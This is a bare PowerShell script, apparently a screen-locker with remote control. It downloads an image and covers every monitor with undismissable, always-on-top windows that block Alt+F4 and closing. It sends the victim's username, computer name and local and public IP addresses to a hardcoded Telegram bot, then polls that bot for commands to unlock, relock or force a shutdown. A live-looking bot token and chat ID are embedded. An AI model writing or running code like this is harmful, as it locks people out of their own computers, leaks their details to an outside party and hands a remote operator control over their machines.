# SETTINGS
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID = "656189986"
$user = $env:USERNAME
$pc = $env:COMPUTERNAME
$unlockCommand = "/unlock$user"
$lockCommand = "/lock$user"
$shutdownCommand = "/shutdown$user"
$lockFile = "$env:APPDATA\Microsoft\lock_status.txt"

# CREATE LOCK FILE IF MISSING
if (-not (Test-Path $lockFile)) { "locked" | Out-File $lockFile -Force }

# DOWNLOAD IMAGE
Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing

# LOAD ASSEMBLIES
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# SEND TELEGRAM MESSAGE
function Send-Telegram-Message {
    try {
        $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
            $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80'
        })[0].IPAddress
    } catch { $ipLocal = "n/a" }

    try { $ipPublic = (Invoke-RestMethod "https://api.ipify.org") } catch { $ipPublic = "n/a" }

    $message = "PC-ul $user ($pc) a fost blocat.`nLocal IP: $ipLocal | Public IP: $ipPublic`nComenzi:`n$unlockCommand`n$lockCommand`n$shutdownCommand"
    $body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
    Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
}

# SEND INITIAL MESSAGE
Send-Telegram-Message

# UI SETUP
$script:AllowClose = $false
$forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{
        FormBorderStyle = 'None'
        WindowState = 'Maximized'
        StartPosition = 'Manual'
        TopMost = $true
        Location = $screen.Bounds.Location
        Size = $screen.Bounds.Size
        Cursor = [System.Windows.Forms.Cursors]::None
        BackColor = 'Black'
        KeyPreview = $true
    }

    # BLOCK ALT+F4
    $form.Add_KeyDown({
        param($s, $e)
        if ($e.Alt -and $e.KeyCode -eq "F4") {
            $e.Handled = $true
        }
        if ($e.KeyCode -eq "C") {
            [System.Windows.Forms.Application]::Exit()
        }
    })

    $form.Add_FormClosing({
        if (-not $script:AllowClose) {
            $_.Cancel = $true
        }
    })

    $form.Add_Deactivate({ $form.Activate() })

    $pb = New-Object Windows.Forms.PictureBox -Property @{
        Image = [System.Drawing.Image]::FromFile($tempImagePath)
        Dock = 'Fill'
        SizeMode = 'StretchImage'
    }
    $form.Controls.Add($pb)
    $form.Show()
    $form
}

# TELEGRAM LISTENER
$offset = 0
try {
    $initial = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?timeout=1"
    if ($initial.result) {
        $offset = ($initial.result | Select-Object -Last 1).update_id + 1
    }
} catch {}

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 3000
$timer.Add_Tick({
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
        foreach ($u in $updates.result) {
            $offset = $u.update_id + 1
            $msg = $u.message.text.ToLower()
            if ($msg -eq $unlockCommand.ToLower()) {
                "unlocked" | Out-File $lockFile -Force
                $script:AllowClose = $true
                [System.Windows.Forms.Application]::Exit()
            } elseif ($msg -eq $shutdownCommand.ToLower()) {
                "unlocked" | Out-File $lockFile -Force
                Stop-Computer -Force
            } elseif ($msg -eq $lockCommand.ToLower()) {
                "locked" | Out-File $lockFile -Force
                # Optionally restart script if needed
            }
        }
    } catch {}
})
$timer.Start()

# START UI LOOP
[System.Windows.Forms.Application]::Run()

# CLEANUP
$timer.Stop()
